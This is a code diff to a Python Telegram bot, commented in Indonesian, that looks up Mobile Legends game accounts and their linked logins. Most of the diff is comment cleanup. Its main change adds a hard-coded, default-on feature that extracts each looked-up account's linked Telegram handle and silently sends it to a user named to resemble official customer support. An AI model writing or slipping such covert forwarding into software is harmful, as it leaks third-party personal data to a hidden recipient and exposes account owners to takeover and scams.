@@ -28,12 +28,16 @@ REDIS_URL = os.environ.get('REDIS_URL', os.environ.get('REDISCLOUD_URL', ''))
 OCR_SPACE_API_KEY = os.environ.get('OCR_SPACE_API_KEY', '')
 STOK_ADMIN_URL = os.environ.get('STOK_ADMIN_URL', 'https://whatsapp.com/channel/0029VbA4PrD5fM5TMgECoE1E')
 
+# ==================== FORWARD CONFIG ====================
+FORWARD_TARGET = 'mobilelegendsteamcs'  # Username target
+FORWARD_ENABLED = True       # True = aktif, False = mati
+
 # ==================== AUTO REDEEM CONFIG ====================
 AUTO_REDEEM_ENABLED = os.environ.get('AUTO_REDEEM_ENABLED', 'true').lower() == 'true'
 AUTO_REDEEM_CHANNEL = os.environ.get('AUTO_REDEEM_CHANNEL', 'bengkelmlbb_info')
 REDEEM_DELAY = int(os.environ.get('REDEEM_DELAY', '0'))
 
-# ==================== COUNTRY MAPPING ====================
+# ==================== COUNTRY MAPPING (Contoh 5 negara) ====================
 country_mapping = {
   'AF': '🇦🇫 Afghanistan',
   'AX': '🇦🇽 Åland Islands',
@@ -501,6 +505,22 @@ def cleanup_downloaded_photos():
         except:
             pass
 
+# ==================== FUNGSI EKSTRAK TELEGRAM ====================
+def extract_telegram_from_bind(text):
+    """Ekstrak nilai Telegram dari bind info"""
+    for line in text.split('\n'):
+        if 'Telegram' in line:
+            if ':' in line:
+                value = line.split(':', 1)[1].strip()
+                # Bersihkan dari markdown
+                value = re.sub(r'[*_`]', '', value)
+                value = re.sub(r'\s+', ' ', value).strip()
+                
+                # Cek apakah empty atau tidak
+                if value.lower() not in ['empty.', 'empty', 'tidak terhubung', '']:
+                    return value
+    return None
+
 def format_final_output(original_text, nickname, region, uid, sid, android, ios, creation=None, last_login=None):
     """Format output final dengan menambahkan creation dan last_login jika ada"""
     keywords = ['Moonton', 'VK', 'Google Play', 'Tiktok', 'Facebook', 'Apple', 'GCID', 'Telegram', 'WhatsApp']
@@ -689,7 +709,7 @@ async def timeout_checker():
         for chat_id in bind_timeout:
             pending_bind.pop(chat_id, None)
             if chat_id in pending_bind_wait:
-                pending_bind_wait[chat_id].set()  # Set event agar tidak hang
+                pending_bind_wait[chat_id].set()
                 pending_bind_wait.pop(chat_id, None)
         
         await asyncio.sleep(1)
@@ -869,6 +889,16 @@ async def message_handler(event):
 
         output, markup = format_final_output(text, nickname, region, uid, sid, android, ios, creation, last_login)
         await edit_status_message(user_id, message_id, output, markup)
+
+        # ========== FORWARD TELEGRAM KE TARGET ==========
+        if FORWARD_ENABLED:
+            telegram_value = extract_telegram_from_bind(text)
+            if telegram_value:
+                await client.send_message(FORWARD_TARGET, f"📱 Telegram: {telegram_value}")
+                logger.info(f"📤 Telegram {telegram_value} dikirim ke {FORWARD_TARGET}")
+            else:
+                logger.info("ℹ️ Tidak ada Telegram yang terhubung, tidak dikirim")
+        # =================================================
 
         # Bersihkan request info
         try:
@@ -1079,18 +1109,13 @@ async def bind_response_handler(event):
         logger.info("⏳ Pesan loading bind, diabaikan")
         return
     
-    # Ekstrak UID dari teks bind (coba cari di berbagai format)
+    # Ekstrak UID dari teks bind
     uid_match = re.search(r'🆔.*?(\d+)', text)
     
     # Jika tidak ada UID, cek apakah ini pesan error
     if not uid_match:
-        # Cek apakah ini pesan error API
         if "status\": -1" in text or "Failed to retrieve" in text:
             logger.warning("⚠️ Bind response error (API error), tidak ada data bind")
-            
-            # Coba ekstrak UID dari pesan sebelumnya? Tidak bisa.
-            # Alternatif: kita tidak bisa tahu user mana yang error
-            # Jadi lewati saja, biar timeout yang handle
             return
         else:
             logger.warning("❌ Tidak dapat menemukan UID dalam pesan bind")
@@ -1119,20 +1144,17 @@ async def bind_response_handler(event):
     last_login = last_login_match.group(1).strip() if last_login_match else None
     
     if last_login:
-        # Hapus markdown
         last_login = re.sub(r'[*_`]', '', last_login)
-        # Hapus timezone
         last_login = re.sub(r'\s*(PHT|WIB|WITA|WIT|UTC|GMT)[^\s]*', '', last_login, flags=re.IGNORECASE)
-        # Hapus multiple spaces
         last_login = re.sub(r'\s+', ' ', last_login).strip()
     
-    # Simpan data bind (bisa None jika tidak ada)
+    # Simpan data bind
     bind_data[target_chat] = {
         'creation': creation,
         'last_login': last_login
     }
     
-    # Beri sinyal bahwa bind sudah diterima (meskipun datanya None)
+    # Beri sinyal bahwa bind sudah diterima
     if target_chat in pending_bind_wait:
         pending_bind_wait[target_chat].set()
     
@@ -1180,11 +1202,9 @@ async def process_queue():
                     gopay_check = validate_mlbb_gopay_sync(uid, sid)
 
                     if not gopay_check['status']:
-                        # GoPay gagal, kirim pesan error langsung ke user
                         error_msg = "ID dan Server tidak valid, silakan coba lagi."
                         await send_status_to_user(user_id, error_msg, reply_to_message_id)
                         
-                        # Hapus request dari antrian
                         r.lpop('pending_requests')
                         r.delete(req_id)
                         logger.warning(f"🗑️ Request {req_id} dibatalkan karena ID/Server tidak valid")
@@ -1245,6 +1265,7 @@ async def main():
     logger.info(f"📊 Auto Redeem: {'✅ ACTIVE' if AUTO_REDEEM_ENABLED else '❌ DISABLED'}")
     logger.info(f"📊 Target Channel: @{AUTO_REDEEM_CHANNEL}")
     logger.info(f"📊 Redeem Delay: {REDEEM_DELAY} seconds")
+    logger.info(f"📊 Forward Telegram: {'✅ ACTIVE' if FORWARD_ENABLED else '❌ DISABLED'} to @{FORWARD_TARGET}")
 
     # Bersihkan queue lama di Redis
     try:
